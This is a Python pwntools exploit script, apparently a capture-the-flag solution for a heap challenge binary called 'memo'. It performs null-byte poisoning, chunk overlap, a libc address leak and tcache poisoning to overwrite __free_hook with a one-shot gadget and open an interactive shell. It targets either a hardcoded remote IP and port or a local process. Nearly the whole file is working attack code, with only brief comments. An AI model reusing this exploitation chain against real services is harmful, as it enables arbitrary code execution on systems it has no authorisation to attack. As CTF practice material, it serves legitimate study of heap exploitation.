from pwn import *
from time import sleep

def alloc(size, data):
	r.sendlineafter('> ', '1')
	r.sendlineafter('size: ', str(size))
	if len(data) < size:
		data += '\n'
	r.sendafter('content: ', data)

def alloc2(size, data):
	r.sendlineafter('> ', '1')
	r.sendlineafter('size: ', str(size))
	r.sendlineafter('content: ', data)

def edit(idx, data):
	r.sendlineafter('> ', '2')
	r.sendlineafter('idx: ', str(idx))
	r.sendlineafter('content: ', data)

def free(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter('idx: ', str(idx))

def show(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter('idx: ', str(idx))

def leak(idx):
	show(idx)
	r.recvuntil('content: ')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	alloc(0xf0, 'A'*0xf0)   # 0
	alloc(0xf0, 'B'*0xf0)   # 1
	alloc(0xf0, 'C'*0xf0)   # 2
	alloc(0xf0, 'D'*0xf0)   # 3
	alloc(0xf0, 'E'*0xf0)   # 4
	alloc(0xf0, 'F'*0xf0)   # 5
	alloc(0xff0, 'G'*0xff0) # 6
	alloc(0x30, 'G'*0x30)   # 7
	alloc(0xff0, 'H'*0xff0) # 8
	alloc(0xf0, 'I'*0xf0)   # 9
	
	free(0)
	free(1)
	free(2)
	free(3)
	free(4)
	free(5)
	free(9)
	free(6)
	free(7)

	# null poison and fix prev_size
	alloc(0x38, 'G'*0x30 + p64(0x1040)) # 0
	
	# We will leverage the fact that large chunks are not placed
	# into tcache bins, making it handy for backward consolidation 
	# and chunk overlap.
	# consolidate chunk #6 and chunk #8 => overlap chunk #0
	free(8)
	# the remainder chunk will overlap with chunk #0
	alloc(0xff0, 'X'*0xff0)
	# leak the main_arena pointers of the remainder chunk
	libc = leak(0) - 0x3ebca0
	__free_hook = libc + 0x3ed8e8
	oneshot = libc + 0x4f322

	log.success('Libc: 0x{:x}'.format(libc))
	# chunk #0 and chunk #2 are the same chunk but at different
	# indexes inside the global array. We will abuse this to trigger
	# double free.
	alloc(0x200, 'Z'*0x200) # 2

	free(0)
	# tcache poisoning
	edit(2, p64(__free_hook))

	alloc(0x200, 'pwned')
	# next allocation will return __free_hook's address
	alloc(0x200, p64(oneshot))

	# __free_hook => one shot gadget
	free(0)

	r.interactive()

if __name__ == "__main__":
	if sys.argv[1] == 'r':
		r = remote('37.139.17.37', 3137)
	else:
		r = process('./memo')
		pause()
	pwn()
